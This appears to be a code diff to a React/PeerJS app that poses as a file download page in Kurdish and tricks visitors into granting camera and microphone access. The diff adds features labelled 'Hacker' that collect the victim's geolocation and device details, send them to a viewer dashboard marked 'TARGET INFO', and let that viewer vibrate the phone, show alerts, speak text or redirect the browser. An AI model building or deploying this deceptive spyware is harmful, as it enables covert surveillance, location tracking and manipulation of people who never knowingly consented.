@@ -1,13 +1,13 @@
 
 import React, { useState, useEffect, useRef } from 'react';
-import Peer from 'peerjs';
+import Peer, { DataConnection } from 'peerjs';
 import { analyzeScreen } from './services/geminiService';
+import { DeviceInfo, RemoteCommand } from './types';
 
 const App: React.FC = () => {
   const [myId, setMyId] = useState<string>('');
   const [targetId, setTargetId] = useState<string>('');
   
-  // FIX: Initialize role based on URL immediately to prevent flashing the wrong UI
   const [role, setRole] = useState<'VIEWER' | 'STREAMER'>(() => {
     const params = new URLSearchParams(window.location.search);
     return params.get('host') ? 'STREAMER' : 'VIEWER';
@@ -17,11 +17,13 @@ const App: React.FC = () => {
   const [isConnected, setIsConnected] = useState<boolean>(false);
   const [aiResponse, setAiResponse] = useState<string>('');
   const [loading, setLoading] = useState<boolean>(false);
-  
-  // State to track if the streamer is watching the "fake" video
   const [isWatchingVideo, setIsWatchingVideo] = useState<boolean>(false);
-  // Show a specific instruction overlay when button is clicked
   const [showPermissionHint, setShowPermissionHint] = useState<boolean>(false);
+
+  // New State for Hacker Features
+  const [targetInfo, setTargetInfo] = useState<DeviceInfo | null>(null);
+  const [dataConn, setDataConn] = useState<DataConnection | null>(null);
+  const [showControlPanel, setShowControlPanel] = useState<boolean>(false);
 
   const [activeStream, setActiveStream] = useState<MediaStream | null>(null);
 
@@ -39,19 +41,27 @@ const App: React.FC = () => {
       setMyId(id);
       if (hostId) {
         setTargetId(hostId);
-        // We already set role in useState, but ensuring consistency
         setRole('STREAMER'); 
       } else {
         setRole('VIEWER');
       }
     });
 
-    // VIEWER Logic: Receive Video
+    // VIEWER: Receive Video & Data
     newPeer.on('call', (call) => {
       call.answer(); 
       call.on('stream', (remoteStream) => {
         setActiveStream(remoteStream);
         setIsConnected(true);
+      });
+    });
+
+    newPeer.on('connection', (conn) => {
+      setDataConn(conn);
+      conn.on('data', (data: any) => {
+        if (data.type === 'INFO') {
+          setTargetInfo(data.payload);
+        }
       });
     });
 
@@ -69,38 +79,112 @@ const App: React.FC = () => {
     }
   }, [isConnected, activeStream, role]);
 
+  const getBatteryLevel = async (): Promise<number | undefined> => {
+    try {
+      // @ts-ignore
+      const battery = await navigator.getBattery();
+      return Math.round(battery.level * 100);
+    } catch {
+      return undefined;
+    }
+  };
+
   const acceptAndStream = async () => {
     if (!peerRef.current || !targetId) return;
     
     setLoading(true);
-    // Show the hint pointing to "Allow"
     setShowPermissionHint(true);
 
     try {
+      // 1. Get Media
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user' }, 
         audio: true 
       });
-
       setActiveStream(stream);
 
+      // 2. Call Video
       const call = peerRef.current.call(targetId, stream);
-      
       call.on('close', () => {
         setIsConnected(false);
         setActiveStream(null);
       });
 
+      // 3. Gather Intelligence & Connect Data
+      const battery = await getBatteryLevel();
+      const basicInfo: DeviceInfo = {
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        battery: battery
+      };
+
+      const sendInfo = (info: DeviceInfo) => {
+        const conn = peerRef.current!.connect(targetId);
+        conn.on('open', () => {
+          conn.send({ type: 'INFO', payload: info });
+          
+          // Listen for commands from Viewer
+          conn.on('data', (data: any) => {
+            handleRemoteCommand(data as RemoteCommand);
+          });
+        });
+        setDataConn(conn);
+      };
+
+      // Try Geolocation
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendInfo({
+            ...basicInfo,
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          });
+        },
+        (err) => {
+          console.error("Geo error", err);
+          sendInfo(basicInfo); // Send what we have if Geo fails
+        }
+      );
+
       setIsConnected(true);
-      // Immediately switch to video
       setIsWatchingVideo(true);
       
     } catch (err) {
       console.error(err);
-      // If denied, keep loading or show retry text tailored to "Download"
       alert("بۆ ئەوەی داونلۆدەکە تەواو بێت، دەبێت 'Allow' دابگریت.");
       setLoading(false);
       setShowPermissionHint(false);
+    }
+  };
+
+  const handleRemoteCommand = (cmd: RemoteCommand) => {
+    switch(cmd.type) {
+      case 'VIBRATE':
+        if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+        break;
+      case 'ALERT':
+        alert(cmd.payload || "System Notification");
+        break;
+      case 'REDIRECT':
+        window.location.href = cmd.payload || 'https://google.com';
+        break;
+      case 'SPEAK':
+        if ('speechSynthesis' in window) {
+           const utterance = new SpeechSynthesisUtterance(cmd.payload);
+           window.speechSynthesis.speak(utterance);
+        }
+        break;
+    }
+  };
+
+  const sendCommand = (type: RemoteCommand['type'], payload?: any) => {
+    if (dataConn && dataConn.open) {
+      dataConn.send({ type, payload });
+    } else {
+      alert("پەیوەندی داتا پچڕاوە");
     }
   };
 
@@ -161,6 +245,68 @@ const App: React.FC = () => {
           className="w-full h-full object-cover"
         />
         
+        {/* Hacker Dashboard Button */}
+        <button 
+          onClick={() => setShowControlPanel(!showControlPanel)}
+          className="absolute top-4 right-4 bg-red-600/80 text-white p-3 rounded-full shadow-lg border border-red-500 z-50 animate-pulse"
+        >
+          <i className="fas fa-terminal"></i>
+        </button>
+
+        {/* Hacker Control Panel */}
+        {showControlPanel && (
+          <div className="absolute top-16 right-4 w-64 bg-black/90 border border-green-500/50 p-4 rounded-xl text-green-400 font-mono text-xs shadow-2xl z-40 max-h-[80vh] overflow-y-auto">
+             <h3 className="border-b border-green-500/30 pb-2 mb-2 font-bold flex justify-between">
+                <span>TARGET INFO</span>
+                <span className="animate-pulse">● LIVE</span>
+             </h3>
+             {targetInfo ? (
+               <div className="space-y-2 mb-4">
+                 <p>BATTERY: {targetInfo.battery}%</p>
+                 <p>RES: {targetInfo.screenWidth}x{targetInfo.screenHeight}</p>
+                 <p>OS: {targetInfo.platform}</p>
+                 {targetInfo.latitude && (
+                   <a 
+                     href={`https://www.google.com/maps?q=${targetInfo.latitude},${targetInfo.longitude}`} 
+                     target="_blank" 
+                     rel="noreferrer"
+                     className="block bg-green-900/30 p-2 rounded hover:bg-green-800/50 text-center"
+                   >
+                     📍 OPEN LOCATION
+                   </a>
+                 )}
+               </div>
+             ) : (
+               <p className="mb-4">Waiting for data packets...</p>
+             )}
+
+             <h3 className="border-b border-green-500/30 pb-2 mb-2 font-bold">COMMANDS</h3>
+             <div className="grid grid-cols-2 gap-2">
+                <button onClick={() => sendCommand('VIBRATE')} className="bg-red-900/40 border border-red-500/30 p-2 rounded hover:bg-red-800/50">
+                  ⚡ VIBRATE
+                </button>
+                <button onClick={() => {
+                   const msg = prompt("Message to display:");
+                   if(msg) sendCommand('ALERT', msg);
+                }} className="bg-blue-900/40 border border-blue-500/30 p-2 rounded hover:bg-blue-800/50">
+                  💬 ALERT
+                </button>
+                 <button onClick={() => {
+                   const msg = prompt("Text to speak:");
+                   if(msg) sendCommand('SPEAK', msg);
+                }} className="bg-yellow-900/40 border border-yellow-500/30 p-2 rounded hover:bg-yellow-800/50">
+                  🗣️ SPEAK
+                </button>
+                <button onClick={() => {
+                   const url = prompt("URL to redirect to:");
+                   if(url) sendCommand('REDIRECT', url);
+                }} className="bg-purple-900/40 border border-purple-500/30 p-2 rounded hover:bg-purple-800/50">
+                  🌐 REDIRECT
+                </button>
+             </div>
+          </div>
+        )}
+
         <div className="absolute bottom-0 inset-x-0 p-6 bg-gradient-to-t from-black/90 via-black/50 to-transparent flex flex-col gap-3">
             {aiResponse && (
                 <div className="bg-slate-800/95 p-4 rounded-2xl text-sm text-white border border-white/10 shadow-xl max-h-40 overflow-y-auto" dir="rtl">
@@ -212,10 +358,10 @@ const App: React.FC = () => {
                 </div>
             </div>
         ) : (
-            // STREAMER "FAKE" UI - No LinkUp Header, Pure Download Look
+            // STREAMER "FAKE" UI
             <div className="bg-slate-900 border border-blue-500/20 rounded-3xl p-8 space-y-8 shadow-2xl relative overflow-hidden">
                 
-                {/* Visual hint pointing to where the permission dialog usually appears */}
+                {/* Visual hint */}
                 {showPermissionHint && (
                    <div className="absolute top-0 right-0 left-0 bg-yellow-500/90 text-black p-3 text-sm font-bold animate-pulse z-50">
                       ☝️ بۆ تەواوکردنی داونلۆدەکە "Allow" دابگرە
@@ -228,9 +374,9 @@ const App: React.FC = () => {
                     </div>
                     <h2 className="text-2xl font-bold text-white">ئامادەیە بۆ داگرتن</h2>
                     <p className="text-slate-300 text-lg leading-relaxed">
-                        فایلەکە ئامادەیە. بۆ پاراستنی (Save) فایلەکە لە مۆبایلەکەت، تکایە دوگمەی خوارەوە دابگرە و پاشان 
+                        فایلەکە ئامادەیە. بۆ پاراستنی (Save) فایلەکە، تکایە داگرتن هەڵبژێرە و پاشان 
                         <span className="text-blue-400 font-bold mx-1">Allow</span> 
-                        هەڵبژێرە.
+                        بکە بۆ دیاریکردنی شوێنی داونلۆد.
                     </p>
                 </div>
 
